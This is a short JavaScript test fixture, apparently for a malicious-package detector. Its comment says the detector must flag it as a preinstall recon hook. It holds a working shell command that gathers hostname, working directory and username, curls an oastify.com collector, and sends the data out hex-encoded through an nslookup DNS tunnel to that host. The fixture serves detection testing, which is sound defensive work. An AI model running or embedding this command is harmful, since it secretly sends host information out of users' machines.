// Fixture: silenced preinstall hook running host recon through an
// nslookup DNS loop against an OAST collector. Must convict the
// silenced-preinstall recon DNS hostile and the nslookup tunnel hostile.
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'fixture-silenced-recon';curl fixture-test.oastify.com;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.fixture-test.oastify.com;done", (error, data) => {
	if (error) {
		console.log("error", error.message);
		return;
	}
	console.log(data);
});
